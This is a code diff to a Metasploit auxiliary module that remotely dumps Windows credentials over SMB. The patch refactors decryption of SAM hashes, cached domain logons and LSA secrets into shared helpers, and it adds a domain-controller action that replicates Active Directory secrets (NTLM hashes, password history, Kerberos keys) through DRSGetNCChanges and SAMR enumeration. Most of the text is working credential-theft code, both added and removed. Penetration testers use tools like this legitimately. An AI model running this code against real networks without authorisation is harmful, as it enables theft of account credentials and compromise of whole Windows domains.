@@ -4,12 +4,14 @@
 ##
 
 require 'metasploit/framework/hashes/identify'
+require 'ruby_smb/dcerpc/client'
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::SMB::Client::Authenticated
   include Msf::Exploit::Remote::DCERPC
-  include Msf::Post::Windows::Priv
   include Msf::Auxiliary::Report
+  include Msf::Util::WindowsRegistry
+  include Msf::Util::WindowsCryptoHelpers
 
   def initialize(info = {})
     super(
@@ -24,13 +26,19 @@ class MetasploitModule < Msf::Auxiliary
           downloads the temporary hive files and reads the rest of the data
           from it. This temporary files are removed when it's done.
 
+          On domain controllers, secrets from Active Directory is extracted
+          using [MS-DRDS] DRSGetNCChanges(), replicating the attributes we need
+          to get SIDs, NTLM hashes, groups, password history, Kerberos keys and
+          other interesting data. Note that the actual `NTDS.dit` file is not
+          downloaded. Instead, the Directory Replication Service directly asks
+          Active Directory through RPC requests.
+
           This modules takes care of starting or enabling the Remote Registry
           service if needed. It will restore the service to its original state
           when it's done.
 
           This is a port of the great Impacket `secretsdump.py` code written by
-          Alberto Solino. Note that the `NTDS.dit` technique has not been
-          implement yet. It will be done in a next iteration.
+          Alberto Solino.
         },
         'License' => MSF_LICENSE,
         'Author' => [
@@ -44,7 +52,15 @@ class MetasploitModule < Msf::Auxiliary
           'Reliability' => [],
           'Stability' => [],
           'SideEffects' => [ IOC_IN_LOGS ]
-        }
+        },
+        'Actions' => [
+          [ 'ALL', { 'Description' => 'Dump everything' } ],
+          [ 'SAM', { 'Description' => 'Dump SAM hashes' } ],
+          [ 'CACHE', { 'Description' => 'Dump cached hashes' } ],
+          [ 'LSA', { 'Description' => 'Dump LSA secrets' } ],
+          [ 'DOMAIN', { 'Description' => 'Dump domain secrets (credentials, password history, Kerberos keys, etc.)' } ]
+        ],
+        'DefaultAction' => 'ALL'
       )
     )
 
@@ -52,89 +68,6 @@ class MetasploitModule < Msf::Auxiliary
 
     @service_should_be_stopped = false
     @service_should_be_disabled = false
-    @lsa_vista_style = true
-  end
-
-  class CacheData < BinData::Record
-    mandatory_parameter :user_name_length
-    mandatory_parameter :domain_name_length
-    mandatory_parameter :dns_domain_name_length
-    mandatory_parameter :upn_length
-    mandatory_parameter :effective_name_length
-    mandatory_parameter :full_name_length
-    mandatory_parameter :logon_script_length
-    mandatory_parameter :profile_path_length
-    mandatory_parameter :home_directory_length
-    mandatory_parameter :home_directory_drive_length
-    mandatory_parameter :group_count
-    mandatory_parameter :logon_domain_name_length
-
-    endian :little
-
-    string   :enc_hash, length: 16
-    string   :unknown, length: 56
-    string16 :username, length: -> { user_name_length }
-    string   :pad1, length: -> { pad_length(username) }
-    string16 :domain_name, length: -> { domain_name_length }
-    string   :pad2, length: -> { pad_length(domain_name) }
-    string16 :dns_domain_name, length: -> { dns_domain_name_length }
-    string   :pad3, length: -> { pad_length(dns_domain_name) }
-    string16 :upn, length: -> { upn_length }
-    string   :pad4, length: -> { pad_length(upn) }
-    string16 :effective_name, length: -> { effective_name_length }
-    string   :pad5, length: -> { pad_length(effective_name) }
-    string16 :full_name, length: -> { full_name_length }
-    string   :pad6, length: -> { pad_length(full_name) }
-    string16 :logon_script, length: -> { logon_script_length }
-    string   :pad7, length: -> { pad_length(logon_script) }
-    string16 :profile_path, length: -> { profile_path_length }
-    string   :pad8, length: -> { pad_length(profile_path) }
-    string16 :home_directory, length: -> { home_directory_length }
-    string   :pad9, length: -> { pad_length(home_directory) }
-    string16 :home_directory_drive, length: -> { home_directory_drive_length }
-    string   :pad10, length: -> { pad_length(home_directory_drive) }
-    array    :groups, initial_length: -> { group_count } do
-      uint32 :relative_id
-      uint32 :attributes
-    end
-    string16 :logon_domain_name, length: -> { logon_domain_name_length }
-
-    # Determines the correct length for the padding, so that the next
-    # field is 4-byte aligned.
-    def pad_length(prev_element)
-      offset = (prev_element.abs_offset + prev_element.to_binary_s.length) % 4
-      (4 - offset) % 4
-    end
-  end
-
-  class CacheEntry < BinData::Record
-    endian :little
-
-    uint16    :user_name_length
-    uint16    :domain_name_length
-    uint16    :effective_name_length
-    uint16    :full_name_length
-    uint16    :logon_script_length
-    uint16    :profile_path_length
-    uint16    :home_directory_length
-    uint16    :home_directory_drive_length
-    uint32    :user_id
-    uint32    :primary_group_id
-    uint32    :group_count
-    uint16    :logon_domain_name_length
-    uint16    :logon_domain_id_length
-    file_time :last_access
-    uint32    :revision
-    uint32    :sid_count
-    uint16    :valid
-    uint16    :iteration_count
-    uint32    :sif_length
-    uint32    :logon_package
-    uint16    :dns_domain_name_length
-    uint16    :upn_length
-    string    :iv, length: 16
-    string    :ch, length: 16
-    array     :enc_data, type: :uint8, read_until: :eof
   end
 
   def enable_registry
@@ -197,18 +130,18 @@ class MetasploitModule < Msf::Auxiliary
     @winreg.close_key(root_key_handle) if root_key_handle
   end
 
-  def lm_hash_not_stored?
+  def check_lm_hash_not_stored
     vprint_status('Checking NoLMHash policy')
     res = @winreg.read_registry_key_value('HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa', 'NoLmHash', bind: false)
     if res == 1
       vprint_status('LMHashes are not being stored')
-      return true
+      @lm_hash_not_stored = true
     else
       vprint_status('LMHashes are being stored')
-      return false
+      @lm_hash_not_stored = false
     end
   rescue RubySMB::Dcerpc::Error::WinregError => e
-    vprint_warning("An error occured when checking NoLMHash policy: #{e}")
+    vprint_error("An error occured when checking NoLMHash policy: #{e}")
   end
 
   def save_registry_key(hive_name)
@@ -252,193 +185,6 @@ class MetasploitModule < Msf::Auxiliary
     retrieve_hive('SECURITY')
   end
 
-  def get_hboot_key(reg_parser, boot_key)
-    vprint_status('Calculating HashedBootKey from SAM')
-    qwerty = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"
-    digits = "0123456789012345678901234567890123456789\0"
-
-    _value_type, value_data = reg_parser.get_value('SAM\\Domains\\Account', 'F')
-    revision = value_data[0x68, 4].unpack('V')[0]
-    case revision
-    when 1
-      hash = Digest::MD5.new
-      hash.update(value_data[0x70, 16] + qwerty + boot_key + digits)
-      rc4 = OpenSSL::Cipher.new('rc4')
-      rc4.decrypt
-      rc4.key = hash.digest
-      hboot_key = rc4.update(value_data[0x80, 32])
-      hboot_key << rc4.final
-      hboot_key
-    when 2
-      aes = OpenSSL::Cipher.new('aes-128-cbc')
-      aes.decrypt
-      aes.key = boot_key
-      aes.padding = 0
-      aes.iv = value_data[0x78, 16]
-      aes.update(value_data[0x88, 16]) # we need only 16 bytes
-    else
-      print_warning("Unknown hbootKey revision: #{revision}")
-      ''.b
-    end
-  end
-
-  def enum_key(reg_parser, key)
-    parent_key = reg_parser.find_key(key)
-    return nil unless parent_key
-
-    return reg_parser.enum_key(parent_key)
-  end
-
-  def enum_values(reg_parser, key)
-    key_obj = reg_parser.find_key(key)
-    return nil unless key_obj
-
-    return reg_parser.enum_values(key_obj)
-  end
-
-  def get_user_keys(reg_parser)
-    users = {}
-    users_key = 'SAM\\Domains\\Account\\Users'
-    rids = enum_key(reg_parser, users_key)
-    if rids
-      rids.delete('Names')
-
-      rids.each do |rid|
-        _value_type, value_data = reg_parser.get_value("#{users_key}\\#{rid}", 'V')
-        users[rid.to_i(16)] ||= {}
-        users[rid.to_i(16)][:V] = value_data
-
-        # Attempt to get Hints
-        _value_type, value_data = reg_parser.get_value("#{users_key}\\#{rid}", 'UserPasswordHint')
-        next unless value_data
-
-        users[rid.to_i(16)][:UserPasswordHint] =
-          value_data.dup.force_encoding(::Encoding::UTF_16LE).encode(::Encoding::UTF_8).strip
-      end
-    end
-
-    # Retrieve the user names for each RID
-    # TODO: use a proper structure to do this, since the user names are included in V data
-    names = enum_key(reg_parser, "#{users_key}\\Names")
-    if names
-      names.each do |name|
-        value_type, _value_data = reg_parser.get_value("#{users_key}\\Names\\#{name}", '')
-        users[value_type] ||= {}
-        # Apparently, key names are ISO-8859-1 encoded
-        users[value_type][:Name] = name.dup.force_encoding(::Encoding::ISO_8859_1).encode(::Encoding::UTF_8)
-      end
-    end
-
-    users
-  end
-
-  # TODO: use a proper structure for V data, instead of unpacking directly
-  def decrypt_user_keys(hboot_key, users)
-    sam_lmpass = "LMPASSWORD\x00"
-    sam_ntpass = "NTPASSWORD\x00"
-    sam_empty_lm = ['aad3b435b51404eeaad3b435b51404ee'].pack('H*')
-    sam_empty_nt = ['31d6cfe0d16ae931b73c59d7e0c089c0'].pack('H*')
-
-    users.each do |rid, user|
-      next unless user[:V]
-
-      hashlm_off = user[:V][0x9c, 4]&.unpack('V')&.first
-      hashlm_len = user[:V][0xa0, 4]&.unpack('V')&.first
-      if hashlm_off && hashlm_len
-        hashlm_enc = user[:V][hashlm_off + 0xcc, hashlm_len]
-        user[:hashlm] = decrypt_user_hash(rid, hboot_key, hashlm_enc, sam_lmpass, sam_empty_lm)
-      else
-        print_error('Unable to extract LM hash')
-        user[:hashlm] = sam_empty_lm
-      end
-
-      hashnt_off = user[:V][0xa8, 4]&.unpack('V')&.first
-      hashnt_len = user[:V][0xac, 4]&.unpack('V')&.first
-      if hashnt_off && hashnt_len
-        hashnt_enc = user[:V][hashnt_off + 0xcc, hashnt_len]
-        user[:hashnt] = decrypt_user_hash(rid, hboot_key, hashnt_enc, sam_ntpass, sam_empty_nt)
-      else
-        print_error('Unable to extract NT hash')
-        user[:hashlm] = sam_empty_nt
-      end
-    end
-
-    users
-  end
-
-  def rid_to_key(rid)
-    s1 = [rid].pack('V')
-    s1 << s1[0, 3]
-
-    s2b = [rid].pack('V').unpack('C4')
-    s2 = [s2b[3], s2b[0], s2b[1], s2b[2]].pack('C4')
-    s2 << s2[0, 3]
-
-    [convert_des_56_to_64(s1), convert_des_56_to_64(s2)]
-  end
-
-  def decrypt_user_hash(rid, hboot_key, enc_hash, pass, default)
-    revision = enc_hash[2, 2]&.unpack('v')&.first
-
-    case revision
-    when 1
-      if enc_hash.length < 20
-        return default
-      end
-
-      md5 = Digest::MD5.new
-      md5.update(hboot_key[0, 16] + [rid].pack('V') + pass)
-
-      rc4 = OpenSSL::Cipher.new('rc4')
-      rc4.decrypt
-      rc4.key = md5.digest
-      okey = rc4.update(enc_hash[4, 16])
-    when 2
-      if enc_hash.length < 40
-        return default
-      end
-
-      aes = OpenSSL::Cipher.new('aes-128-cbc')
-      aes.decrypt
-      aes.key = hboot_key[0, 16]
-      aes.padding = 0
-      aes.iv = enc_hash[8, 16]
-      okey = aes.update(enc_hash[24, 16]) # we need only 16 bytes
-    else
-      print_error("Unknown user hash revision: #{revision}")
-      return default
-    end
-
-    des_k1, des_k2 = rid_to_key(rid)
-
-    d1 = OpenSSL::Cipher.new('des-ecb')
-    d1.decrypt
-    d1.padding = 0
-    d1.key = des_k1
-
-    d2 = OpenSSL::Cipher.new('des-ecb')
-    d2.decrypt
-    d2.padding = 0
-    d2.key = des_k2
-
-    d1o = d1.update(okey[0, 8])
-    d1o << d1.final
-
-    d2o = d2.update(okey[8, 8])
-    d1o << d2.final
-    d1o + d2o
-  end
-
-  def service_data
-    {
-      address: rhost,
-      port: rport,
-      service_name: 'smb',
-      protocol: 'tcp',
-      workspace_id: myworkspace_id
-    }
-  end
-
   def report_creds(user, hash, type: :ntlm_hash, jtr_format: '', realm_key: nil, realm_value: nil)
     service_data = {
       address: rhost,
@@ -476,13 +222,16 @@ class MetasploitModule < Msf::Auxiliary
 
   def dump_sam_hashes(reg_parser, boot_key)
     print_status('Dumping SAM hashes')
-    hboot_key = get_hboot_key(reg_parser, boot_key)
+    vprint_status('Calculating HashedBootKey from SAM')
+    hboot_key = reg_parser.get_hboot_key(boot_key)
     unless hboot_key.present?
       print_warning('Unable to get hbootKey')
       return
     end
-    users = get_user_keys(reg_parser)
-    decrypt_user_keys(hboot_key, users)
+    users = reg_parser.get_user_keys
+    users.each do |rid, user|
+      user[:hashnt], user[:hashlm] = decrypt_user_key(hboot_key, user[:V], rid)
+    end
 
     print_status('Password hints:')
     hint_count = 0
@@ -509,153 +258,66 @@ class MetasploitModule < Msf::Auxiliary
 
   def get_lsa_secret_key(reg_parser, boot_key)
     print_status('Decrypting LSA Key')
-    vprint_status('Getting PolEKList...')
-    _value_type, value_data = reg_parser.get_value('\\Policy\\PolEKList')
-    if value_data
-      vprint_status('Vista or above system')
-
-      lsa_key = decrypt_lsa_data(value_data, boot_key)
-      lsa_key = lsa_key[68, 32] unless lsa_key.empty?
-    else
-      vprint_status('Getting PolSecretEncryptionKey...')
-      _value_type, value_data = reg_parser.get_value('\\Policy\\PolSecretEncryptionKey')
-      # If that didn't work, then we're out of luck
-      return nil if value_data.nil?
-
-      vprint_status('XP or below system')
-      @lsa_vista_style = false
-
-      md5x = Digest::MD5.new
-      md5x << boot_key
-      1000.times do
-        md5x << value_data[60, 16]
-      end
-
-      rc4 = OpenSSL::Cipher.new('rc4')
-      rc4.decrypt
-      rc4.key = md5x.digest
-      lsa_key = rc4.update(value_data[12, 48])
-      lsa_key << rc4.final
-      lsa_key = lsa_key[0x10..0x1F]
-    end
+    lsa_key = reg_parser.lsa_secret_key(boot_key)
 
     vprint_good("LSA key: #{lsa_key.unpack('H*')[0]}")
+
+    if reg_parser.lsa_vista_style
+      vprint_status('Vista or above system')
+    else
+      vprint_status('XP or below system')
+    end
+
     return lsa_key
   end
 
   def get_nlkm_secret_key(reg_parser, lsa_key)
     print_status('Decrypting NL$KM')
-    _value_type, value_data = reg_parser.get_value('\\Policy\\Secrets\\NL$KM\\CurrVal')
-    return nil unless value_data
 
-    if lsa_vista_style?
-      nlkm_dec = decrypt_lsa_data(value_data, lsa_key)
-    else
-      value_data_size = value_data[0, 4].unpack('<L').first
-      nlkm_dec = decrypt_secret_data(value_data[(value_data.size - value_data_size)..-1], lsa_key)
-    end
-
-    return nlkm_dec
-  end
-
-  def decrypt_hash_vista(edata, nlkm, iv)
-    aes = OpenSSL::Cipher.new('aes-128-cbc')
-    aes.decrypt
-    aes.key = nlkm[16...32]
-    aes.padding = 0
-    aes.iv = iv
-
-    decrypted = ''
-    (0...edata.length).step(16) do |i|
-      decrypted << aes.update(edata[i, 16])
-    end
-
-    return decrypted
-  end
-
-  def decrypt_hash(edata, nlkm, iv)
-    rc4key = OpenSSL::HMAC.digest(OpenSSL::Digest.new('md5'), nlkm, iv)
-    rc4 = OpenSSL::Cipher.new('rc4')
-    rc4.decrypt
-    rc4.key = rc4key
-    decrypted = rc4.update(edata)
-    decrypted << rc4.final
-
-    return decrypted
+    reg_parser.nlkm_secret_key(lsa_key)
   end
 
   def dump_cached_hashes(reg_parser, nlkm_key)
     print_status('Dumping cached hashes')
-    values = enum_values(reg_parser, '\\Cache')
-    unless values
+
+    cache_infos = reg_parser.cached_infos(nlkm_key)
+    if cache_infos.nil? || cache_infos.empty?
       print_status('No cashed entries')
       return
     end
 
-    values.delete('NL$Control')
-    iteration_count = nil
-    if values.delete('NL$IterationCount')
-      _value_type, value_data = reg_parser.get_value('\\Cache', 'NL$IterationCount')
-      if value_data.to_i > 10240
-        iteration_count = value_data.to_i & 0xfffffc00
-      else
-        iteration_count = value_data.to_i * 1024
-      end
-    end
-
     hashes = ''
-    values.each do |value|
-      vprint_status("Looking into #{value}")
-      _value_type, value_data = reg_parser.get_value('\\Cache', value)
-      nl = value_data
+    cache_infos.each do |cache_info|
+      vprint_status("Looking into #{cache_info.name}")
 
-      cache = CacheEntry.read(nl)
+      next unless cache_info.entry.user_name_length > 0
 
-      next unless (cache.user_name_length > 0)
+      vprint_status("Reg entry: #{cache_info.entry.to_hex}")
+      vprint_status("Encrypted data: #{cache_info.entry.enc_data.to_hex}")
+      vprint_status("IV:  #{cache_info.entry.iv.to_hex}")
 
-      vprint_status("Reg entry: #{nl.unpack('H*')[0]}")
-      vprint_status("Encrypted data: #{cache.enc_data.to_hex}")
-      vprint_status("IV:  #{cache.iv.to_hex}")
+      vprint_status("Decrypted data: #{cache_info.data.to_hex}")
 
-      enc_data = cache.enc_data.map(&:chr).join
-      if lsa_vista_style?
-        dec_data = decrypt_hash_vista(enc_data, nlkm_key, cache.iv)
-      else
-        dec_data = decrypt_hash(enc_data, nlkm_key, cache.iv)
-      end
-
-      vprint_status("Decrypted data: #{dec_data.unpack('H*')[0]}")
-
-      params = cache.snapshot.to_h.select { |key, _v| key.to_s.end_with?('_length') }
-      params[:group_count] = cache.group_count
-      cache_data = CacheData.new(params).read(dec_data)
-      username = cache_data.username.encode(::Encoding::UTF_8)
-      if iteration_count.nil? && lsa_vista_style?
-        if (cache.iteration_count > 10240)
-          iteration_count = cache.iteration_count & 0xfffffc00
-        else
-          iteration_count = cache.iteration_count * 1024
-        end
-      end
+      username = cache_info.data.username.encode(::Encoding::UTF_8)
       info = []
       info << ("Username: #{username}")
-      if iteration_count
-        info << ("Iteration count: #{cache.iteration_count} -> real #{iteration_count}")
+      if cache_info.iteration_count
+        info << ("Iteration count: #{cache_info.iteration_count} -> real #{cache_info.real_iteration_count}")
       end
-      info << ("Last login: #{cache.last_access.to_time}")
-      dns_domain_name = cache_data.dns_domain_name.encode(::Encoding::UTF_8)
+      info << ("Last login: #{cache_info.entry.last_access.to_time}")
+      dns_domain_name = cache_info.data.dns_domain_name.encode(::Encoding::UTF_8)
       info << ("DNS Domain Name: #{dns_domain_name}")
-      info << ("UPN: #{cache_data.upn.encode(::Encoding::UTF_8)}")
-      info << ("Effective Name: #{cache_data.effective_name.encode(::Encoding::UTF_8)}")
-      info << ("Full Name: #{cache_data.full_name.encode(::Encoding::UTF_8)}")
-      info << ("Logon Script: #{cache_data.logon_script.encode(::Encoding::UTF_8)}")
-      info << ("Profile Path: #{cache_data.profile_path.encode(::Encoding::UTF_8)}")
-      info << ("Home Directory: #{cache_data.home_directory.encode(::Encoding::UTF_8)}")
-      info << ("Home Directory Drive: #{cache_data.home_directory_drive.encode(::Encoding::UTF_8)}")
-      info << ("User ID: #{cache.user_id}")
-      info << ("Primary Group ID: #{cache.primary_group_id}")
-      info << ("Additional groups: #{cache_data.groups.map(&:relative_id).join(' ')}")
-      logon_domain_name = cache_data.logon_domain_name.encode(::Encoding::UTF_8)
+      info << ("UPN: #{cache_info.data.upn.encode(::Encoding::UTF_8)}")
+      info << ("Effective Name: #{cache_info.data.effective_name.encode(::Encoding::UTF_8)}")
+      info << ("Full Name: #{cache_info.data.full_name.encode(::Encoding::UTF_8)}")
+      info << ("Logon Script: #{cache_info.data.logon_script.encode(::Encoding::UTF_8)}")
+      info << ("Profile Path: #{cache_info.data.profile_path.encode(::Encoding::UTF_8)}")
+      info << ("Home Directory: #{cache_info.data.home_directory.encode(::Encoding::UTF_8)}")
+      info << ("Home Directory Drive: #{cache_info.data.home_directory_drive.encode(::Encoding::UTF_8)}")
+      info << ("User ID: #{cache_info.entry.user_id}")
+      info << ("Primary Group ID: #{cache_info.entry.primary_group_id}")
+      info << ("Additional groups: #{cache_info.data.groups.map(&:relative_id).join(' ')}")
+      logon_domain_name = cache_info.data.logon_domain_name.encode(::Encoding::UTF_8)
       info << ("Logon domain name: #{logon_domain_name}")
 
       report_info(info.join('; '), 'user.cache_info')
@@ -666,10 +328,10 @@ class MetasploitModule < Msf::Auxiliary
         realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
         realm_value: logon_domain_name
       }
-      if lsa_vista_style?
-        jtr_hash = "$DCC2$#{iteration_count}##{username}##{cache_data.enc_hash.to_hex}:#{dns_domain_name}:#{logon_domain_name}"
+      if reg_parser.lsa_vista_style
+        jtr_hash = "$DCC2$#{cache_info.real_iteration_count}##{username}##{cache_info.data.enc_hash.to_hex}:#{dns_domain_name}:#{logon_domain_name}"
       else
-        jtr_hash = "M$#{username}##{cache_data.enc_hash.to_hex}:#{dns_domain_name}:#{logon_domain_name}"
+        jtr_hash = "M$#{username}##{cache_info.data.enc_hash.to_hex}:#{dns_domain_name}:#{logon_domain_name}"
       end
       credential_opts[:jtr_format] = identify_hash(jtr_hash)
       unless report_creds("#{logon_domain_name}\\#{username}", jtr_hash, **credential_opts)
@@ -681,7 +343,7 @@ class MetasploitModule < Msf::Auxiliary
     if hashes.empty?
       print_line('No cached hashes on this system')
     else
-      print_status("Hash#{'es' if hashes.lines.size > 1} are in '#{lsa_vista_style? ? 'mscash2' : 'mscash'}' format")
+      print_status("Hash#{'es' if hashes.lines.size > 1} are in '#{reg_parser.lsa_vista_style ? 'mscash2' : 'mscash'}' format")
       print_line(hashes)
     end
   end
@@ -741,103 +403,6 @@ class MetasploitModule < Msf::Auxiliary
     "#{domain.upcase}host#{host.downcase}.#{domain.downcase}".b
   end
 
-  def add_parity(byte_str)
-    byte_str.map do |byte|
-      if byte.to_s(2).count('1').odd?
-        (byte << 1) & 0b11111110
-      else
-        (byte << 1) | 0b00000001
-      end
-    end
-  end
-
-  def fix_parity(byte_str)
-    byte_str.map do |byte|
-      t = byte.to_s(2).rjust(8, '0')
-      if t[0, 7].count('1').odd?
-        ("#{t[0, 7]}0").to_i(2).chr
-      else
-        ("#{t[0, 7]}1").to_i(2).chr
-      end
-    end
-  end
-
-  def weak_des_key?(key)
-    [
-      "\x01\x01\x01\x01\x01\x01\x01\x01",
-      "\xFE\xFE\xFE\xFE\xFE\xFE\xFE\xFE",
-      "\x1F\x1F\x1F\x1F\x0E\x0E\x0E\x0E",
-      "\xE0\xE0\xE0\xE0\xF1\xF1\xF1\xF1",
-      "\x01\xFE\x01\xFE\x01\xFE\x01\xFE",
-      "\xFE\x01\xFE\x01\xFE\x01\xFE\x01",
-      "\x1F\xE0\x1F\xE0\x0E\xF1\x0E\xF1",
-      "\xE0\x1F\xE0\x1F\xF1\x0E\xF1\x0E",
-      "\x01\xE0\x01\xE0\x01\xF1\x01\xF1",
-      "\xE0\x01\xE0\x01\xF1\x01\xF1\x01",
-      "\x1F\xFE\x1F\xFE\x0E\xFE\x0E\xFE",
-      "\xFE\x1F\xFE\x1F\xFE\x0E\xFE\x0E",
-      "\x01\x1F\x01\x1F\x01\x0E\x01\x0E",
-      "\x1F\x01\x1F\x01\x0E\x01\x0E\x01",
-      "\xE0\xFE\xE0\xFE\xF1\xFE\xF1\xFE",
-      "\xFE\xE0\xFE\xE0\xFE\xF1\xFE\xF1"
-    ].include?(key)
-  end
-
-  def aes_cts_hmac_sha1_96_key(algorithm, raw_secret, salt)
-    iterations = 4096
-    cipher = OpenSSL::Cipher::AES.new(algorithm)
-    key = OpenSSL::PKCS5.pbkdf2_hmac_sha1(raw_secret, salt, iterations, cipher.key_len)
-    plaintext = "kerberos\x7B\x9B\x5B\x2B\x93\x13\x2B\x93".b
-    rnd_seed = ''.b
-    loop do
-      cipher.reset
-      cipher.encrypt
-      cipher.iv = "\x00".b * 16
-      cipher.key = key
-      ciphertext = cipher.update(plaintext)
-      rnd_seed += ciphertext
-      break unless rnd_seed.size < cipher.key_len
-
-      plaintext = ciphertext
-    end
-    rnd_seed.unpack('H*')[0]
-  end
-
-  def des_cbc_md5(raw_secret, salt)
-    odd = true
-    tmp_byte_str = [0, 0, 0, 0, 0, 0, 0, 0]
-    plaintext = raw_secret + salt
-    plaintext += "\x00".b * (8 - (plaintext.size % 8))
-    plaintext.bytes.each_slice(8) do |block|
-      tmp_56 = block.map { |byte| byte & 0b01111111 }
-      if !odd
-        # rubocop:disable Style/FormatString
-        tmp_56_str = tmp_56.map { |byte| '%07b' % byte }.join
-        # rubocop:enable Style/FormatString
-        tmp_56_str.reverse!
-        tmp_56 = tmp_56_str.bytes.each_slice(7).map do |bits7|
-          bits7.map(&:chr).join.to_i(2)
-        end
-      end
-      odd = !odd
-      tmp_byte_str = tmp_byte_str.zip(tmp_56).map { |a, b| a ^ b }
-    end
-    tempkey = add_parity(tmp_byte_str).map(&:chr).join
-    if weak_des_key?(tempkey)
-      tempkey[7] = (tempkey[7].ord ^ 0xF0).chr
-    end
-    cipher = OpenSSL::Cipher.new('DES-CBC')
-    cipher.encrypt
-    cipher.iv = tempkey
-    cipher.key = tempkey
-    chekcsumkey = cipher.update(plaintext)[-8..-1]
-    chekcsumkey = fix_parity(chekcsumkey.bytes).map(&:chr).join
-    if weak_des_key?(chekcsumkey)
-      chekcsumkey[7] = (chekcsumkey[7].ord ^ 0xF0).chr
-    end
-    chekcsumkey.unpack('H*')[0]
-  end
-
   def get_machine_kerberos_keys(raw_secret, _machine_name)
     vprint_status('Calculating machine account Kerberos keys')
     # Attempt to create Kerberos keys from machine account (if possible)
@@ -850,8 +415,8 @@ class MetasploitModule < Msf::Auxiliary
 
     raw_secret = raw_secret.dup.force_encoding(::Encoding::UTF_16LE).encode(::Encoding::UTF_8, invalid: :replace).b
 
-    secret << "aes256-cts-hmac-sha1-96:#{aes_cts_hmac_sha1_96_key('256-CBC', raw_secret, salt)}"
-    secret << "aes128-cts-hmac-sha1-96:#{aes_cts_hmac_sha1_96_key('128-CBC', raw_secret, salt)}"
+    secret << "aes256-cts-hmac-sha1-96:#{aes256_cts_hmac_sha1_96(raw_secret, salt)}"
+    secret << "aes128-cts-hmac-sha1-96:#{aes128_cts_hmac_sha1_96(raw_secret, salt)}"
     secret << "des-cbc-md5:#{des_cbc_md5(raw_secret, salt)}"
 
     secret
@@ -901,8 +466,7 @@ class MetasploitModule < Msf::Auxiliary
       secret = "dpapi_machinekey: 0x#{machine_key.unpack('H*')[0]}\ndpapi_userkey: 0x#{user_key.unpack('H*')[0]}"
     elsif upper_name.start_with?('$MACHINE.ACC')
       md4 = OpenSSL::Digest::MD4.digest(secret_item)
-      machine = simple.client.default_name
-      domain = simple.client.default_domain
+      machine, domain = get_machine_name_and_domain
       print_name = "#{domain}\\#{machine}$"
       ntlm_hash = "#{Net::NTLM.lm_hash('').unpack('H*')[0]}:#{md4.unpack('H*')[0]}"
       secret_ary = ["#{print_name}:#{ntlm_hash}:::"]
@@ -949,26 +513,413 @@ class MetasploitModule < Msf::Auxiliary
   def dump_lsa_secrets(reg_parser, lsa_key)
     print_status('Dumping LSA Secrets')
 
-    keys = enum_key(reg_parser, '\\Policy\\Secrets')
-    return unless keys
-
-    keys.delete('NL$Control')
-
-    keys.each do |key|
-      vprint_status("Looking into #{key}")
-      _value_type, value_data = reg_parser.get_value("\\Policy\\Secrets\\#{key}\\CurrVal")
-      encrypted_secret = value_data
-      next unless encrypted_secret
-
-      if lsa_vista_style?
-        decrypted = decrypt_lsa_data(encrypted_secret, lsa_key)
-        secret_size = decrypted[0, 4].unpack('<L').first
-        secret = decrypted[16, secret_size]
-      else
-        encrypted_secret_size = encrypted_secret[0, 4].unpack('<L').first
-        secret = decrypt_secret_data(encrypted_secret[(encrypted_secret.size - encrypted_secret_size)..-1], lsa_key)
-      end
+    lsa_secrets = reg_parser.lsa_secrets(lsa_key)
+    lsa_secrets.each do |key, secret|
       print_secret(key, secret)
+    end
+  end
+
+  def get_machine_name_and_domain
+    if simple.client&.default_name == ''
+      begin
+        vprint_status('Getting Server Info')
+        wkssvc = @tree.open_file(filename: 'wkssvc', write: true, read: true)
+
+        vprint_status('Binding to \\wkssvc...')
+        wkssvc.bind(endpoint: RubySMB::Dcerpc::Wkssvc)
+        vprint_status('Bound to \\wkssvc')
+
+        info = wkssvc.netr_wksta_get_info
+      rescue RubySMB::Error::RubySMBError => e
+        print_error("Error when connecting to 'wkssvc' interface ([#{e.class}] #{e}).")
+        return
+      end
+      return [info[:wki100_computername].encode('utf-8'), info[:wki100_langroup].encode('utf-8')]
+    end
+    [simple.client.default_name, simple.client.default_domain]
+  end
+
+  def connect_samr(domain_name)
+    vprint_status('Connecting to Security Account Manager (SAM) Remote Protocol')
+    @samr = @tree.open_file(filename: 'samr', write: true, read: true)
+
+    vprint_status('Binding to \\samr...')
+    @samr.bind(endpoint: RubySMB::Dcerpc::Samr)
+    vprint_good('Bound to \\samr')
+
+    @server_handle = @samr.samr_connect
+    @domain_sid = @samr.samr_lookup_domain(server_handle: @server_handle, name: domain_name)
+    @domain_handle = @samr.samr_open_domain(server_handle: @server_handle, domain_id: @domain_sid)
+
+    builtin_domain_sid = @samr.samr_lookup_domain(server_handle: @server_handle, name: 'Builtin')
+    @builtin_domain_handle = @samr.samr_open_domain(server_handle: @server_handle, domain_id: builtin_domain_sid)
+  end
+
+  def get_domain_users
+    users = @samr.samr_enumerate_users_in_domain(domain_handle: @domain_handle)
+    vprint_status("Obtained #{users.length} domain users, fetching the SID for each...")
+    progress_interval = 250
+    nb_digits = (Math.log10(users.length) + 1).floor
+    users = users.each_with_index.map do |(rid, name), index|
+      if index % progress_interval == 0
+        percent = (format('%.2f', (index / users.length.to_f * 100))).rjust(5)
+        print_status("SID enumeration progress - #{index.to_s.rjust(nb_digits)} / #{users.length} (#{percent}%)")
+      end
+      sid = @samr.samr_rid_to_sid(object_handle: @domain_handle, rid: rid)
+      [sid.to_s, name.to_s]
+    end
+    print_status("SID enumeration progress - #{users.length} / #{users.length} (  100%)")
+    users
+  rescue RubySMB::Error::RubySMBError => e
+    print_error("Error when enumerating domain users ([#{e.class}] #{e}).")
+    return
+  end
+
+  def get_user_groups(sid)
+    user_handle = nil
+    rid = sid.split('-').last.to_i
+
+    user_handle = @samr.samr_open_user(domain_handle: @domain_handle, user_id: rid)
+    groups = @samr.samr_get_group_for_user(user_handle: user_handle)
+    groups = groups.map do |group|
+      RubySMB::Dcerpc::Samr::RpcSid.new("#{@domain_sid}-#{group.relative_id.to_i}")
+    end
+
+    alias_groups = @samr.samr_get_alias_membership(domain_handle: @domain_handle, sids: groups + [sid])
+    alias_groups = alias_groups.map do |group|
+      RubySMB::Dcerpc::Samr::RpcSid.new("#{@domain_sid}-#{group}")
+    end
+
+    builtin_alias_groups = @samr.samr_get_alias_membership(domain_handle: @builtin_domain_handle, sids: groups + [sid])
+    builtin_alias_groups = builtin_alias_groups.map do |group|
